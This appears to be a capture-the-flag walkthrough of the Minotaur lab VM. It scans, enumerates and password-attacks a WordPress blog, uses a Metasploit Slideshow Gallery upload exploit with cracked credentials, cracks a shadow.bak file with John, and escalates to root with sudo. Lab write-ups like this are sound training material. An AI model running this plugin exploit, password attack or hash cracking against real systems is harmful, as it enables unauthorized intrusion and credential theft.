@@ -1,0 +1,521 @@
+
+								
+																		Hack the Minotaur VM (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on September 21, 2016
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Minotaur is a Boot2Root CTF challenge which helps us improve our skills, especially of password cracking. The VM will assign itself a specific IP address (in the 192.168.56.0/24 range). Do not change this, as the CTF will not work properly without an IP address of 192.168.56. We know to think about it i.e.:
+One password you will need is not on rockyou.txt or any other wordlist you may have out there. So you need to think of a way to generate it yourself.
+This CTF has a couple of fairly heavy password cracking challenges, and some red herrings.
+You can download this VM from –&gt; https://www.vulnhub.com/entry/sectalks-bne0x00-minotaur,139/
+Hints
+
+This CTF has a couple of fairly heavy password cracking challenges, and some red herrings.
+One password you will need is not on rockyou.txt or any other wordlist you may have out there. So you need to think of a way to generate it yourself.
+
+Penetrating Methodology
+
+Network Scanning (Nmap)
+WordPress scanning &amp; password cracking (wpscan)
+Generate Password Dictionary (Cewl)
+Reverse connection (Metasploit)
+Download shadow.bak and crack Hash (John)
+Sudo right Privilege escalation
+Get Root access and capture the flag.
+
+Let’s Start!!!
+We will start off by nmap because. we already our target IP.
+
+		
+		
+			
+			
+			
+			
+nmap -A 192.168.56.223
+			
+				
+					
+				
+					1
+				
+						nmap -A 192.168.56.223
+					
+				
+			
+		
+
+ 
+As a result of nmap, we can see that the port numbers: 22, 80, 2020 are open. We can use port 22 and 80 to our advantage.
+Now we tried to explore through Nikto and curl but unfortunately, we found nothing of use. So we decided to use dirbuster.
+Go to the terminal of kali and type :
+
+		
+		
+			
+			
+			
+			
+dirbuster
+			
+				
+					
+				
+					1
+				
+						dirbuster
+					
+				
+			
+		
+
+It will open the dirbuster. In it, give the URL in the Target URL box and select the directory-list-2.3-medium.txt file in the File with list of dir box.
+
+It will show you the directory called /bull/  and we open the said directory in our browser.
+
+It will show that there is a blog made in WordPress.  As the blog is in WordPress we can apply WPScan to find usernames and vulnerable themes and plug-ins. To apply the WPScan type:
+
+		
+		
+			
+			
+			
+			
+wpscan -u http://192.168.56.223/bull/ --enumerate u --enumerate p
+			
+				
+					
+				
+					1
+				
+						wpscan -u http://192.168.56.223/bull/ --enumerate u --enumerate p
+					
+				
+			
+		
+
+The command will start executing and it will show you all the plug-ins that are exploitable along with usernames and from its result, you will enumerate the following information :
+One user with the username bully. Also, there is a plug-in exploit for Slideshow Gallery.
+
+But we will require username and password to make this exploit work. Now we already have a username and all we need is its password and we have no idea where to find it as we have no dictionary or password file. The hint we read previously mentions to the requirement of generating our own wordlist. Therefore we will make a password file using ceWL. To make a password file from CeWL go to your terminal of your kali and type:
+
+		
+		
+			
+			
+			
+			
+cewl http://192.168.56.223/bull -m 3 -w /root/Desktop/pass.txt
+			
+				
+					
+				
+					1
+				
+						cewl http://192.168.56.223/bull -m 3 -w /root/Desktop/pass.txt
+					
+				
+			
+		
+
+
+This will create a .txt with a list of all the words that have a possibility to be the password for the username bully.
+Now to find which its password is we will use BurpSuite. So, apply dictionary attack using burpsuite and the moment it will find the correct password it will change it value of length as shown below:
+
+Now that we know username and password we can use that exploit for the plug-in. And to do so open Metasploit and type:
+
+		
+		
+			
+			
+			
+			
+use exploit/unix/webapp/wp_slideshowgallery_upload
+msf exploit(unix/webapp/wp_slideshowgallery_upload) &gt; set rhost 192.168.56.223
+msf exploit(unix/webapp/wp_slideshowgallery_upload) &gt; set targeturi /bull/
+msf exploit(unix/webapp/wp_slideshowgallery_upload) &gt; set wp_user bully
+msf exploit(unix/webapp/wp_slideshowgallery_upload) &gt; set wp_password Bighornedbulls
+msf exploit(unix/webapp/wp_slideshowgallery_upload) &gt; exploit
+			
+				
+					
+				
+					123456
+				
+						use exploit/unix/webapp/wp_slideshowgallery_uploadmsf exploit(unix/webapp/wp_slideshowgallery_upload) &gt; set rhost 192.168.56.223msf exploit(unix/webapp/wp_slideshowgallery_upload) &gt; set targeturi /bull/msf exploit(unix/webapp/wp_slideshowgallery_upload) &gt; set wp_user bullymsf exploit(unix/webapp/wp_slideshowgallery_upload) &gt; set wp_password Bighornedbullsmsf exploit(unix/webapp/wp_slideshowgallery_upload) &gt; exploit
+					
+				
+			
+		
+
+ As the exploit will run it will give you the session of meterpreter.
+
+After digging more and more we found a flag.txt file and shadow.bak inside /tmp directory.
+
+		
+		
+			
+			
+			
+			
+cd /tmp
+ls
+cat flag.txt
+			
+				
+					
+				
+					123
+				
+						cd /tmplscat flag.txt
+					
+				
+			
+		
+
+
+Also, we got a hint that shadow.bak file could be useful to us. Let’s have looked in it.
+
+		
+		
+			
+			
+			
+			
+cat shadow.bak
+			
+				
+					
+				
+					1
+				
+						cat shadow.bak
+					
+				
+			
+		
+
+
+Let’s download it with the help of the following command
+
+		
+		
+			
+			
+			
+			
+download shadow.bak /root/Desktop
+			
+				
+					
+				
+					1
+				
+						download shadow.bak /root/Desktop
+					
+				
+			
+		
+
+
+We will take the help of John password cracker to find the passwords:
+
+		
+		
+			
+			
+			
+			
+john shadow.bak
+			
+				
+					
+				
+					1
+				
+						john shadow.bak
+					
+				
+			
+		
+
+
+We found the passwords for both heffer and minotaur. Please recall that port number 22 i.e. for ssh was open and we can use it to log in and for this type:
+
+		
+		
+			
+			
+			
+			
+ssh heffer@192.168.56.223
+			
+				
+					
+				
+					1
+				
+						ssh heffer@192.168.56.223
+					
+				
+			
+		
+
+Give the password when asked and further check its directories:
+
+		
+		
+			
+			
+			
+			
+ls
+			
+				
+					
+				
+					1
+				
+						ls
+					
+				
+			
+		
+
+We found a flag here. Read it.
+
+		
+		
+			
+			
+			
+			
+cat flag.txt
+			
+				
+					
+				
+					1
+				
+						cat flag.txt
+					
+				
+			
+		
+
+
+Now in the flag, we found another flag along with a hint indicating that the flag is Minotaur. Now we will log in through SSH using minotaur:
+
+		
+		
+			
+			
+			
+			
+ssh minotaur@192.168.56.223
+			
+				
+					
+				
+					1
+				
+						ssh minotaur@192.168.56.223
+					
+				
+			
+		
+
+Give the password when asked. And then check for directories:
+
+		
+		
+			
+			
+			
+			
+ls
+			
+				
+					
+				
+					1
+				
+						ls
+					
+				
+			
+		
+
+There is another flag available. Again read it.
+
+		
+		
+			
+			
+			
+			
+cat flag.txt
+			
+				
+					
+				
+					1
+				
+						cat flag.txt
+					
+				
+			
+		
+
+
+Now, we have finally found the first flag along with another hint that is the final flag is in /root/flag.txt now let check sudo right for user Minotaur.
+
+		
+		
+			
+			
+			
+			
+sudo -l
+			
+				
+					
+				
+					1
+				
+						sudo -l
+					
+				
+			
+		
+
+As you can observe Minotaur has ALL privileges, therefore, let’s move on, type the following to gain admin access and switch user:
+
+		
+		
+			
+			
+			
+			
+sudo su
+			
+				
+					
+				
+					1
+				
+						sudo su
+					
+				
+			
+		
+
+Finally, we have found the last flag.
+
+		
+		
+			
+			
+			
+			
+cat /root/flag.txt
+			
+				
+					
+				
+					1
+				
+						cat /root/flag.txt
+					
+				
+			
+		
+
+WOOHOO!!! The flag is captured. Congrats and enjoy!!
+
+Author: Yashika Dhir is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact here.
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
